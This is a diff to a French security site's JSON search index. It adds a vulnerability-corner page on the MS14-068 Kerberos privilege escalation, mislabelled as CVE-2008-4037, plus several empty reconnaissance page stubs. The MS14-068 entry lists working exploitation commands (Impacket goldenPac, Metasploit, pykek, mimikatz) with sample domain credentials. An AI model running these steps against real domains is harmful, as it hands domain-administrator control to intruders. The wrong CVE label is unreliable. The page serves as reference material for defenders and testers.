@@ -7,6 +7,20 @@
 	"content": ""
 },
 {
+	"uri": "http://lightsecops.github.io/vulnerability_corner/cve-2008-4037/",
+	"title": "CVE-2008-4037",
+	"tags": [],
+	"description": "",
+	"content": "Microsoft Windows Kerberos - Privilege Escalation aka Faux PAC Résumé Date : 18 Novembre 2014\nType : Elevation de privilèges\nDescription : Vulnérabilité critique dans le composant Kerberos Key Distribution Center (KDC). L’exploitation de cette vulnérabilité peut permettre à n’importe quel compte utilisateur du domaine disposant de privilèges standards d’obtenir ceux d’un administrateur du domaine.\nFichier : kdcsvc.dll\nScore CVSS : 9.3\nAccès :\n    Vecteur Complexité Authentification     RESEAU MOYENNE NON     Impact :\n    Confidentialité Intégrité Disponibilité     COMPLETE COMPLETE COMPLETE     Référence :\n MS14-068 CVE-2008-4037  Tools - Impacket foo@bar:~$ python goldenPac.py -dc-ip 172.16.102.15 -target-ip 172.16.102.15 exploit.local/notanadmin:ASDqwe123@dc1\r- Metasploit foo@bar:~$ use auxiliary/admin/kerberos/ms14_068_kerberos_checksum\r- pykek foo@bar:~$ git clone https://github.com/bidord/pykek\rfoo@bar:~$ python ./ms14-068.py -u \u0026lt;userName\u0026gt;@\u0026lt;domainName\u0026gt; -s \u0026lt;userSid\u0026gt; -d \u0026lt;domainControlerAddr\u0026gt; -p \u0026lt;clearPassword\u0026gt;\rfoo@bar:~$ python ./ms14-068.py -u darthsidious@lab.adsecurity.org -p TheEmperor99! -s S-1-5-21-1473643419-774954089-2222329127-1110 -d adsdc02.lab.adsecurity.org\r- mimikatz foo@bar:~$ mimikatz.exe \u0026quot;kerberos::ptc c:\\temp\\TGT_darthsidious@lab.adsecurity.org.ccache\rFonctionnement Quick explanation\nExploit   Attachments   CVE-2008-4037.py  (6 ko)    References  Blog title - Author, Date [Microsoft Windows Kerberos - Privilege Escalation (MS14-068) - Sylvain Monne, 29/03/2019] (https://www.exploit-db.com/exploits/35474) MS14-068 : comment Kerberos a permis la compromission totale de votre domaine Windows- Wavestone Sylvain MONNÉ, 29/03/2019 [ms14068 - Benjamin DELPY - 8 Sep 2015] (https://github.com/gentilkiwi/kekeo/wiki/ms14068)  "
+},
+{
+	"uri": "http://lightsecops.github.io/vulnerability_corner/",
+	"title": "Analyse des Vulnerabilités",
+	"tags": [],
+	"description": "",
+	"content": ""
+},
+{
 	"uri": "http://lightsecops.github.io/methodologies/",
 	"title": "Méthodologies",
 	"tags": [],
@@ -15,6 +29,41 @@
 },
 {
 	"uri": "http://lightsecops.github.io/",
+	"title": "",
+	"tags": [],
+	"description": "",
+	"content": ""
+},
+{
+	"uri": "http://lightsecops.github.io/methodologies/recon/enumeration/dns/",
+	"title": "",
+	"tags": [],
+	"description": "",
+	"content": ""
+},
+{
+	"uri": "http://lightsecops.github.io/methodologies/recon/enumeration/ftp/",
+	"title": "",
+	"tags": [],
+	"description": "",
+	"content": ""
+},
+{
+	"uri": "http://lightsecops.github.io/methodologies/recon/enumeration/ldap/",
+	"title": "",
+	"tags": [],
+	"description": "",
+	"content": ""
+},
+{
+	"uri": "http://lightsecops.github.io/methodologies/recon/enumeration/smb/",
+	"title": "",
+	"tags": [],
+	"description": "",
+	"content": ""
+},
+{
+	"uri": "http://lightsecops.github.io/methodologies/recon/enumeration/snmp/",
 	"title": "",
 	"tags": [],
 	"description": "",
